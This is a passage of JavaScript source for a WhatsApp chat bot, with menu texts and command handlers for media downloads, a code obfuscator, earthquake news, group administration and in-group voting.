│  ${khasmiring}  .ᴘᴇʀᴜɴᴛᴜɴɢᴀɴ 
│  ${khasmiring}  .ᴀʀᴀʜʀᴇᴊᴇᴋɪ 
│  ${khasmiring}  .ꜱɪꜰᴀᴛ 
│  ${khasmiring}  .ᴋᴇʙᴇʀᴜɴᴛᴜɴɢᴀɴ 
│  ${khasmiring}  .ᴍᴇᴍᴀɴᴄɪɴɢ 
│  ${khasmiring}  .ᴍᴀꜱᴀꜱᴜʙᴜʀ 
│  ${khasmiring}  .ᴢᴏᴅɪᴀᴋ 
│  ${khasmiring}  .ꜱʜɪᴏ 
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
break

case "islammenu":
reply(`╭┈──────────────────
│ *${m2}${khasatas1} I S L A M - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴋɪꜱᴀʜɴᴀʙɪ
│  ${khasmiring}  .Qᴜᴏᴛᴇꜱɪꜱʟᴀᴍɪ
│  ${khasmiring}  .ɴɪᴀᴛꜱʜᴏʟᴀᴛ
│  ${khasmiring}  .ʙᴀᴄᴀᴀɴꜱʜᴏʟᴀᴛ
│  ${khasmiring}  .ᴅᴏᴀʜᴀʀɪᴀɴ
│  ${khasmiring}  .ᴀʏᴀᴛᴋᴜʀꜱɪ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
break
      case 'git': case 'gitclone':
if (!args[0]) return m.reply(`Link Nya Mana Kak?\nContoh :\n${prefix}${command} Link Github`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return m.reply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    ptz.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) =>(err))
break

case 'twitter': case 'twitterdl': case 'twitterdl': {
	if (!args[0]) return reply(`📌 Example : \n*${prefix + command}* https://twitter.com/fernandavasro/status/1569741835555291139?t=ADxk8P3Z3prq8USIZUqXCg&s=19`)
	if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply('Link Invalid!')
          try {
          let { SD, HD, desc, thumb, audio } = await fg.twitter(args[0])
          let te = ` 
┌─⊷ *TWITTER DL*
•°• Description: ${desc}
└───────────`
ptz.sendMessage(m.chat, {video: {url:HD}, caption: te}, {quoted: m})
} catch (e) {
  	reply(`Verify that the link is from Twitter`)
	}
}
break
case 'obfus': case 'obfuscate':{
if (!q) return m.reply(`Example ${prefix+command} const mitah = require('axios')`)
async function obfus(query) {
    const jsobfus = require('javascript-obfuscator')
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `zio`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

let meg = await obfus(q)
m.reply(`*Success*

${meg.result}`)
}
break
      
     case 'fb':
           case 'facebook':
case 'facebookvid': {
           if (!args[0]) {
    return m.reply(`Please send the link of a Facebook video\n\nEXAMPLE :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibkotid=Nii9`)
  }
  const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
  if (!urlRegex.test(args[0])) {
    return reply('Url invalid')
  }
  try {
    const result = await fg.fbdl(args[0]);
    const tex = `
        *[ FACEBOOK DL ]*
    Title: ${result.title}`;
    const response = await fetch(result.videoUrl)
    const arrayBuffer = await response.arrayBuffer()
    const videoBuffer = Buffer.from(arrayBuffer)
    ptz.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    reply('Maybe private video!')
  }
  }
  break  
         
           case "sad1":
        case "sad2":
        case "sad3":
        case "sad4":
        case "sad5":
        case "sad6":
        case "sad7":
        case "sad8":
        case "sad9":
        case "sad10":
        case "sad11":
        case "sad12":
        case "sad13":
        case "sad14":
        case "sad15":
        case "sad16":
        case "sad17":
        case "sad18":
        case "sad19":
        case "sad20":
        case "sad21":
        case "sad22":
        case "sad23":
        case "sad24":
        case "sad25":
        case "sad26":
        case "sad27":
        case "sad28":
        case "sad29":
        case "sad30":
        case "sad31":
        case "sad32":
        case "sad33":
        case "sad34":
        case "sad35":
             const moai0 = await getBuffer(
          `https://github.com/ZassTdr/Sound-Sad/raw/main/Sad-Music/${command}.mp3`
         );
         ptz.sendMessage(
          m.chat,
          {
           audio: moai0,
           mimetype: "audio/mp4",
           ptt: true,
          },
          { quoted: m }
         );
         break    
       
        case "absenmon": case "absenmenu":
        reply (`╭┈──────────────────
│ *${m2}${khasatas1} A B S E N - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ʜᴀᴘᴜꜱᴀʙꜱᴇɴ
│  ${khasmiring}  .ᴀʙꜱᴇɴ
│  ${khasmiring}  .ᴄᴇᴋᴀʙꜱᴇɴ
│  ${khasmiring}  .ᴍᴜʟᴀɪᴀʙꜱᴇɴ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
break

case "beritamon": case "beritamenu":
reply (`╭┈──────────────────
│ *${m2}${khasatas1} B R T A - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ꜰᴀᴊᴀʀ
│  ${khasmiring}  .ᴄɴɴ
│  ${khasmiring}  .ʟᴀʏᴀʀᴋᴀᴄᴀ
│  ${khasmiring}  .ᴄɴʙᴄ
│  ${khasmiring}  .ᴛʀɪʙᴜɴ
│  ${khasmiring}  .ɪɴᴅᴏᴢᴏɴᴇ
│  ${khasmiring}  .ᴋᴏᴍᴘᴀꜱ
│  ${khasmiring}  .ᴅᴇᴛɪᴋɴᴇᴡꜱ
│  ${khasmiring}  .ᴅᴀɪʟʏɴᴇᴡꜱ
│  ${khasmiring}  .ɪɴᴇᴡꜱ
│  ${khasmiring}  .ᴏᴋᴇᴢᴏɴᴇ
│  ${khasmiring}  .ꜱɪɴᴅᴏ
│  ${khasmiring}  .ᴛᴇᴍᴘᴏ
│  ${khasmiring}  .ᴀɴᴛᴀʀᴀ
│  ${khasmiring}  .ᴋᴏɴᴛᴀɴ
│  ${khasmiring}  .ᴍᴇʀᴅᴇᴋᴀ
│  ${khasmiring}  .ᴊᴀʟᴀɴᴛɪᴋᴜꜱ-ᴍᴇᴍᴇ
│  ${khasmiring}  .ɢᴇᴍᴘᴀɴᴇᴡꜱ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
break

case "gempanews": {
const link = 'https://data.bmkg.go.id/DataMKG/TEWS/'
try {
let res = await fetch(link+'autogempa.json')
let anu = await res.json()
anu = anu.Infogempa.gempa
let txt = `*GEMPA NEWS*\n\n${anu.Wilayah}\n\n`
txt += `Potensi : ${anu.Potensi}\n`
txt += `Tanggal : ${anu.Tanggal}\n`
txt += `Waktu : ${anu.Jam}\n\n`
txt += `Magnitude : ${anu.Magnitude}\n`
txt += `Kedalaman : ${anu.Kedalaman}\n`
txt += `Koordinat : ${anu.Coordinates}${anu.Dirasakan.length > 3 ? `\nDirasakan : ${anu.Dirasakan}` : ''}`
await ptz.sendMessage(m.chat, { image: { url: link+anu.Shakemap }, caption: txt }, { quoted: m })
} catch (e) {
m.reply(e)
}
}
break   

case "linodemon": case "linodemenu":
        reply (`╭┈──────────────────
│ *${m2}${khasatas1} N O D E - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ʀᴇꜱᴇᴛᴘᴀꜱꜱᴡᴏʀᴅ
│  ${khasmiring}  .ᴅᴇʟᴇᴛᴇʟɪɴᴏᴅᴇ
│  ${khasmiring}  .ʟɪꜱᴛʟɪɴᴏᴅᴇ
│  ${khasmiring}  .ᴏɴʟɪɴᴏᴅᴇ
│  ${khasmiring}  .ᴏꜰꜰʟɪɴᴏᴅᴇ
│  ${khasmiring}  .ʀᴇʙᴏᴏᴛʟɪɴᴏᴅᴇ
│  ${khasmiring}  .ʀᴇʙᴜɪʟᴅʟɪɴᴏᴅᴇ
│  ${khasmiring}  .ꜱɪꜱᴀʟɪɴᴏᴅᴇ
│  ${khasmiring}  .ꜱᴀʟᴅᴏʟɪɴᴏᴅᴇ
│  ${khasmiring}  .ᴄᴇᴋᴠᴘꜱʟɪɴᴏᴅᴇ
│  ${khasmiring}  .ʟɪɴᴏᴅᴇ2ɢʙ
│  ${khasmiring}  .ʟɪɴᴏᴅᴇ4ɢʙ
│  ${khasmiring}  .ʟɪɴᴏᴅᴇ8ɢʙ
│  ${khasmiring}  .ʟɪɴᴏᴅᴇ16ɢʙ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
break

case "domon": case "domenu": case "digitalocean":
        reply (`╭┈──────────────────
│ *${m2}${khasatas1} D O - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴅᴇʟᴅʀᴏᴘʟᴇᴛ
│  ${khasmiring}  .ꜱᴠᴘꜱ / ꜱᴇɴᴅᴠᴘꜱ
│  ${khasmiring}  .ʟɪꜱᴛᴅʀᴏᴘʟᴇᴛ
│  ${khasmiring}  .ᴄᴇᴋᴅʀᴏᴘʟᴇᴛ
│  ${khasmiring}  .ᴛᴜʀɴᴏꜰꜰ
│  ${khasmiring}  .ᴛᴜʀɴᴏɴ
│  ${khasmiring}  .ꜱɪꜱᴀᴅʀᴏᴘʟᴇᴛ
│  ${khasmiring}  .ʀᴇʙᴜɪʟᴅ
│  ${khasmiring}  .ʀᴇꜱᴛᴀʀᴛᴠᴘꜱ
│  ${khasmiring}  .ᴠᴘꜱ1ɢ1ᴄ
│  ${khasmiring}  .ᴠᴘꜱ2ɢ1ᴄ
│  ${khasmiring}  .ᴠᴘꜱ4ɢ2ᴄ
│  ${khasmiring}  .ᴠᴘꜱ8ɢ4ᴄ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
break
         case "photooxymenu": case "photooxymon": case "photooxy":
        reply(`╭┈──────────────────
│ *${m2}${khasatas1} P H O X Y - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ꜱʜᴀᴅᴏᴡ 
│  ${khasmiring}  .ᴡʀɪᴛᴇ 
│  ${khasmiring}  .ʀᴏᴍᴀɴᴛɪᴄ 
│  ${khasmiring}  .ʙᴜʀɴᴘᴀᴘᴇʀ 
│  ${khasmiring}  .ꜱᴍᴏᴋᴇ 
│  ${khasmiring}  .ɴᴀʀᴜᴛᴏʙᴀɴɴᴇʀ 
│  ${khasmiring}  .ʟᴏᴠᴇ 
│  ${khasmiring}  .ᴜɴᴅᴇʀɢʀᴀꜱꜱ 
│  ${khasmiring}  .ᴅᴏᴜʙʟᴇʟᴏᴠᴇ 
│  ${khasmiring}  .ᴄᴏꜰꜰᴇᴄᴜᴘ 
│  ${khasmiring}  .ᴜɴᴅᴇʀᴡᴀᴛᴇʀᴏᴄᴇᴀɴ 
│  ${khasmiring}  .ꜱᴍᴏᴋʏɴᴇᴏɴ 
│  ${khasmiring}  .ꜱᴛᴀʀꜱᴛᴇxᴛ 
│  ${khasmiring}  .ʀᴀɪɴʙᴏᴡᴇꜰꜰᴇᴄᴛ 
│  ${khasmiring}  .ʙᴀʟʟᴏᴏɴᴛᴇxᴛ 
│  ${khasmiring}  .ᴍᴇᴛᴀʟʟɪᴄᴇꜰꜰᴇᴄᴛ 
│  ${khasmiring}  .ᴇᴍʙʀᴏɪᴅᴇʀʏᴛᴇxᴛ 
│  ${khasmiring}  .ꜰʟᴀᴍɪɴɢᴛᴇxᴛ 
│  ${khasmiring}  .ꜱᴛᴏɴᴇᴛᴇxᴛ 
│  ${khasmiring}  .ᴡʀɪᴛᴇᴀʀᴛ 
│  ${khasmiring}  .ꜱᴜᴍᴍᴇʀᴛᴇxᴛ 
│  ${khasmiring}  .ᴡᴏʟꜰᴍᴇᴛᴀʟᴛᴇxᴛ 
│  ${khasmiring}  .ɴᴀᴛᴜʀᴇ3ᴅᴛᴇxᴛ 
│  ${khasmiring}  .ʀᴏꜱᴇꜱᴛᴇxᴛ 
│  ${khasmiring}  .ɴᴀᴛᴜʀᴇᴛʏᴘᴏɢʀᴀᴘʜʏ 
│  ${khasmiring}  .Qᴜᴏᴛᴇꜱᴜɴᴅᴇʀ 
│  ${khasmiring}  .ꜱʜɪɴᴇᴛᴇxᴛ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
  break
                case "ephotomenu": case "ephotomon": case "ephoto":
        reply(`╭┈──────────────────
│ *${m2}${khasatas1} E P H T O - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ɢʟɪᴛᴄʜᴛᴇxᴛ 
│  ${khasmiring}  .ᴡʀɪᴛᴇᴛᴇxᴛ 
│  ${khasmiring}  .ᴀᴅᴠᴀɴᴄᴇᴅɢʟᴏᴡ 
│  ${khasmiring}  .ᴛʏᴘᴏɢʀᴀᴘʜʏᴛᴇxᴛ 
│  ${khasmiring}  .ᴘɪxᴇʟɢʟɪᴛᴄʜ 
│  ${khasmiring}  .ɴᴇᴏɴɢʟɪᴛᴄʜ 
│  ${khasmiring}  .ꜰʟᴀɢᴛᴇxᴛ 
│  ${khasmiring}  .ꜰʟᴀɢ3ᴅᴛᴇxᴛ 
│  ${khasmiring}  .ᴅᴇʟᴇᴛɪɴɢᴛᴇxᴛ 
│  ${khasmiring}  .ʙʟᴀᴄᴋᴘɪɴᴋꜱᴛʏʟᴇ 
│  ${khasmiring}  .ɢʟᴏᴡɪɴɢᴛᴇxᴛ 
│  ${khasmiring}  .ᴜɴᴅᴇʀᴡᴀᴛᴇʀᴛᴇxᴛ 
│  ${khasmiring}  .ʟᴏɢᴏᴍᴀᴋᴇʀ 
│  ${khasmiring}  .ᴄᴀʀᴛᴏᴏɴꜱᴛʏʟᴇ 
│  ${khasmiring}  .ᴘᴀᴘᴇʀᴄᴜᴛꜱᴛʏʟᴇ 
│  ${khasmiring}  .ᴡᴀᴛᴇʀᴄᴏʟᴏʀᴛᴇxᴛ 
│  ${khasmiring}  .ᴇꜰꜰᴇᴄᴛᴄʟᴏᴜᴅꜱ 
│  ${khasmiring}  .ʙʟᴀᴄᴋᴘɪɴᴋʟᴏɢᴏ 
│  ${khasmiring}  .ɢʀᴀᴅɪᴇɴᴛᴛᴇxᴛ 
│  ${khasmiring}  .ꜱᴜᴍᴍᴇʀʙᴇᴀᴄʜ 
│  ${khasmiring}  .ʟᴜxᴜʀʏɢᴏʟᴅ 
│  ${khasmiring}  .ᴍᴜʟᴛɪᴄᴏʟᴏʀᴇᴅɴᴇᴏɴ 
│  ${khasmiring}  .ꜱᴀɴᴅꜱᴜᴍᴍᴇʀ 
│  ${khasmiring}  .ɢᴀʟᴀxʏᴡᴀʟʟᴘᴀᴘᴇʀ 
│  ${khasmiring}  .1917ꜱᴛʏʟᴇ 
│  ${khasmiring}  .ᴍᴀᴋɪɴɢɴᴇᴏɴ 
│  ${khasmiring}  .ʀᴏʏᴀʟᴛᴇxᴛ 
│  ${khasmiring}  .ꜰʀᴇᴇᴄʀᴇᴀᴛᴇ 
│  ${khasmiring}  .ɢᴀʟᴀxʏꜱᴛʏʟᴇ 
│  ${khasmiring}  .ʟɪɢʜᴛᴇꜰꜰᴇᴄᴛꜱ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
  break
  
  
       
        case "voicemon": case "voicemenu":
        reply(`╭┈──────────────────
│ *${m2}${khasatas1} V O I C E - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ʙᴀꜱꜱ
│  ${khasmiring}  .ʙʟᴏᴡɴ
│  ${khasmiring}  .ᴅᴇᴇᴘ
│  ${khasmiring}  .ᴇᴀʀʀᴀᴘᴇ
│  ${khasmiring}  .ꜰᴀꜱᴛ
│  ${khasmiring}  .ꜰᴀᴛ
│  ${khasmiring}  .ɴɪɢʜᴛᴄᴏʀᴇ
│  ${khasmiring}  .ʀᴇᴠᴇʀꜱᴇ
│  ${khasmiring}  .ʀᴏʙᴏᴛ
│  ${khasmiring}  .ꜱʟᴏᴡ
│  ${khasmiring}  .ꜱᴍᴏᴏᴛʜ
│  ${khasmiring}  .ᴛᴜᴘᴀɪ
│  ${khasmiring}  .ꜱᴍᴏᴏᴛʜ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
        
        case "privatemon": case "privatemenu":
        reply(`╭┈──────────────────
│ *${m2}${khasatas1} P R V T - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴍᴇɴꜰᴇꜱꜱ
│  ${khasmiring}  .ꜱᴛᴏᴘᴄᴏɴꜰᴇꜱꜱ
│  ${khasmiring}  .ᴛᴏʟᴀᴋᴍᴇɴꜰᴇꜱꜱ
│  ${khasmiring}  .ʙᴀʟᴀꜱᴍᴇɴꜰᴇꜱꜱ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
           case "panelmenu": case "panelmon":
        reply(`╭┈──────────────────
│ *${m2}${khasatas1} P N E L - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴀᴅᴅᴜꜱʀ
│  ${khasmiring}  .ᴀᴅᴅꜱʀᴠ
│  ${khasmiring}  .ᴄʀᴀᴛᴇᴀᴅᴍɪɴ
│  ${khasmiring}  .ᴅᴇʟᴜꜱʀ
│  ${khasmiring}  .ᴅᴇʟꜱʀᴠ
│  ${khasmiring}  .ᴅᴇᴛᴜꜱʀ
│  ${khasmiring}  .ʟɪꜱᴛᴀᴅᴍɪɴ
│  ${khasmiring}  .ʟɪꜱᴛᴜꜱʀ
│  ${khasmiring}  .ʟɪꜱᴛꜱʀᴠ
│  ${khasmiring}  .ʀᴇɪɴꜱᴛᴀʟʟ
│  ${khasmiring}  .ʀᴇꜱᴛᴀʀᴛꜱʀᴠ
│  ${khasmiring}  .ʀᴀᴍʟɪꜱᴛ
│  ${khasmiring}  .ꜱᴘᴀɴᴇʟ
│  ${khasmiring}  .ꜱᴛᴀʀᴛꜱʀᴠ
│  ${khasmiring}  .ꜱᴛᴏᴘꜱʀᴠ
│  ${khasmiring}  .ꜱᴜꜱᴘᴇɴᴅ
│  ${khasmiring}  .ᴜɴꜱᴜꜱᴘᴇɴᴅ 
│  ${khasmiring}  .ᴜᴘᴅᴀᴛᴇꜱʀᴠ
│  ${khasmiring}  .ᴡᴇʙᴘᴀɴᴇʟ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break    
    case "groupmon": case "groupmenu":
        reply(`╭┈──────────────────
│ *${m2}${khasatas1} G R U P - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴀᴅᴅ <ᴛᴀɢꜱ>
│  ${khasmiring}  .ᴋɪᴄᴋ <ᴛᴀɢꜱ>
│  ${khasmiring}  .ᴇᴠᴇʀʏᴏɴᴇ 
│  ${khasmiring}  .ᴛᴀɢᴀʟʟ
│  ${khasmiring}  .ʜɪᴅᴇᴛᴀɢ
│  ${khasmiring}  .ᴀɴᴛɪʟɪɴᴋ  <ꜱᴇʟᴇᴄᴛ>
│  ${khasmiring}  .ᴘʀᴏᴍᴏᴛᴇ <ᴛᴀɢꜱ>
│  ${khasmiring}  .ᴅᴇᴍᴏᴛᴇ <ᴛᴀɢꜱ>
│  ${khasmiring}  .ᴡᴇʟᴄᴏᴍᴇ
│  ${khasmiring}  .ꜱᴇᴛᴡᴇʟᴄᴏᴍᴇ
│  ${khasmiring}  .ꜱᴇᴛɢᴏᴏᴅʙʏᴇ
│  ${khasmiring}  .ɪɴᴠɪᴛᴇ
│  ${khasmiring}  .ꜱᴇɴᴅʟɪɴᴋɢᴄ
│  ${khasmiring}  .ʀᴇꜱᴇᴛʟɪɴᴋɢᴄ
│  ${khasmiring}  .ʟɪɴᴋɢʀᴏᴜᴘ
│  ${khasmiring}  .ᴛᴏᴛᴀɢ
│  ${khasmiring}  .ꜱᴇᴛᴘᴘɢʀᴏᴜᴘ
│  ${khasmiring}  .ᴅᴇʟ
│  ${khasmiring}  .ᴅᴇʟᴘᴘɢᴄ
│  ${khasmiring}  .ᴠᴏᴛᴇ
│  ${khasmiring}  .ᴅᴇʟᴇᴛᴇᴠᴏᴛᴇ
│  ${khasmiring}  .ᴜᴘᴠᴏᴛᴇ
│  ${khasmiring}  .ᴅᴏᴡɴᴠᴏᴛᴇ
│  ${khasmiring}  .ᴄʜᴇᴄᴋᴠᴏᴛᴇ
│  ${khasmiring}  .ᴏᴘᴇɴᴛɪᴍᴇ
│  ${khasmiring}  .ᴄʟᴏꜱᴇᴛɪᴍᴇ
│  ${khasmiring}  .ʟᴇᴀᴠᴇɢᴄ
│  ${khasmiring}  .ᴏᴘᴇɴ
│  ${khasmiring}  .ᴄʟᴏꜱᴇ
│  ${khasmiring}  .ʀᴏʟʟ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break  
        
                case 'invite': {
	if (!m.isGroup) return m.reply(`khusus group`)
	if (!isBotAdmins) return m.reply(`gw bukan admin`)
if (!text) return m.reply(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 123233`)
if (!text) return m.reply(`Enter the number`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await ptz.groupInviteCode(group)
      await ptz.sendMessage(text+'@s.whatsapp.net', {text: ` *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
setTimeout(() => {
        reply(` An invite link is sent to the user`) 
}, 1000)
}
break

case 'sendlinkgc': {
if (!m.isGroup) return 
if (!isBotAdmins) return 

if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 123233`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await ptz.groupInviteCode(from)
ptz.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'resetlinkgc': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
await loading()
ptz.groupRevokeInvite(from)
}
break

case 'linkgroup': case 'linkgc': {
if (!m.isGroup) return
if (!isBotAdmins) return 
let response = await ptz.groupInviteCode(from)
ptz.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'totag': {
if (!isBotAdmins) return 
if (!isAdmins) return
if (!m.quoted) return `Reply pesan dengan caption ${prefix + command}`
ptz.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
}
break

case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!m.isGroup) return
if (!isAdmins) return
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
let media = await ptz.downloadAndSaveMediaMessage(m)
await ptz.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply('done')
}
break

case 'd': case 'del': case 'delete': case 'hapus':
if (!m.quoted) return m.reply('Reply pesan yang ingin dihapus!')
ptz.sendMessage(m.chat, {delete: {remoteJid: m.chat, id: m.quoted.id, fromMe: m.quoted.fromMe, participant: m.quoted.sender }})
break

case 'leavegc': {
if (!isCreator) return 
if (!m.isGroup) return
await ptz.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break

case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return
if (!isAdmins) return 
if (!isBotAdmins) return 
    await ptz.removeProfilePicture(from)
    }
    break

          case 'vote': {
            if (!m.isGroup) return 
           if (!text) return m.reply(`Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`)
            reply(`Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌ *${m2}〔 UPVOTE 〕${m2}*
│ 
│ _Total: ${vote[m.chat][1].length}_
│
│ *${m2}〔 DOWNVOTE 〕${m2}*
│
│ _Total: ${vote[m.chat][2].length}_
│
└────•

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            ptz.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return reply(`Khusys group`)
            if (!text) return reply(`_*no voting in this group!*_\n\n*.vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return reply('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌ *${m2}〔 UPVOTE 〕${m2}*
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└──•

┌ *${m2}〔 DOWNVOTE 〕${m2}*
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└──•

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            ptz.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
                case 'downvote': {
            if (!m.isGroup) return reply(`khusus group`)
            if (!text) return reply(`_*no voting in this group!*_\n\n*.vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return reply('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌ *${m2}〔 UPVOTE 〕${m2}*
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└───•

┌ *${m2}〔 DOWNVOTE 〕${m2}*
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────•

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            ptz.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
                 
case 'checkvote':
if (!m.isGroup) return 
if (!text) return reply(`_*no voting in this group!*_\n\n.vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌ *${m2}〔 UPVOTE 〕${m2}*
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└───•

┌ *${m2}〔 DOWNVOTE 〕${m2}*
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└───•

*${prefix}deletevote* - to delete votes
`
ptz.sendTextWithMentions(m.chat, teks_vote, m)
break
